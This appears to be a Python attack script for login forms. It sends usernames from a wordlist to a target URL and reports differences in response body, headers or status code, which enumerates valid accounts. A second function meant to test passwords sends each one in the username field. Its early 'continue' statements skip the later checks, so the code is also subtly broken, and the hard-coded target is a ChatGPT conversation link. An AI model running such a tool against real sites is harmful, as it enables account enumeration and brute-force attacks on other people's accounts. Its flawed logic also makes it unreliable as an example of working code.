import requests

def analyze_response(url):
    try:
        response = requests.get(url)

        # Print the status line (e.g., "HTTP/1.1 200 OK")
        print(f"Status Code: {response.raw.version} {response.status_code} {response.reason}")

        # Print response headers
        print("Response Headers:")
        for key, value in response.headers.items():
            print(f"  {key}: {value}")

        # Print an extra line to separate headers from the body
        print()

        # Print response body
        print("Response Body:")
        print(response.text)

    except requests.RequestException as e:
        print(f"An error occurred: {e}")

def findChangeinUsername(url ,list):
    Findings = []
    data = {'username':'item' , 'password': 'item'}
    response = requests.post(url,data,allow_redirects=False)
    old_response_body = response.text
    old_response_status = response.status_code
    old_response_headers = response.headers
    with open(list , 'r') as list:
        for username in list:
            data = {'username':username , 'password': 'item'}
            new_response = requests.post(url,data,allow_redirects=False)
            if old_response_body == new_response.text:
                continue
            else:
                print(f"Found Change in response <<BODY>> for {username}")
                Findings.append(username)
            if old_response_headers == new_response.headers:
                continue
            else:
                print(f"Found Change in response <<HEADERS>> for {username}")
                Findings.append(username)
            if old_response_status == new_response.status_code:
                continue
            else:
                print(f"Found Change in response <<STATUS CODE>> for {username}")
                Findings.append(username)
    return Findings

def findChangeinPassword(url ,list):
    Findings = []
    data = {'username':'item' , 'password': 'item'}
    response = requests.post(url,data,allow_redirects=False)
    old_response_body = response.text
    old_response_status = response.status_code
    old_response_headers = response.headers
    with open(list , 'r') as list:
        for Password in list:
            data = {'username':Password , 'password': 'item'}
            new_response = requests.post(url,data,allow_redirects=False)
            if old_response_body == new_response.text:
                continue
            else:
                print(f"Found Change in response <<BODY>> for {Password}")
                Findings.append(Password)
            if old_response_headers == new_response.headers:
                continue
            else:
                print(f"Found Change in response <<HEADERS>> for {Password}")
                Findings.append(Password)
            if old_response_status == new_response.status_code:
                continue
            else:
                print(f"Found Change in response <<STATUS CODE>> for {Password}")
                Findings.append(Password)
    return Findings

if __name__ == "__main__":
    # website_url = input("Enter the website URL: ")
    website_url = "https://chat.openai.com/c/9ddae184-f761-48f2-8365-fb334787931c"
    usernameFindigs = findChangeinUsername(website_url,'Codes/usernames.txt')
    passwordFindigs = findChangeinPassword(website_url,'Codes/passwords.txt')
    print(usernameFindigs)
    print(passwordFindigs)
    # analyze_response(website_url)
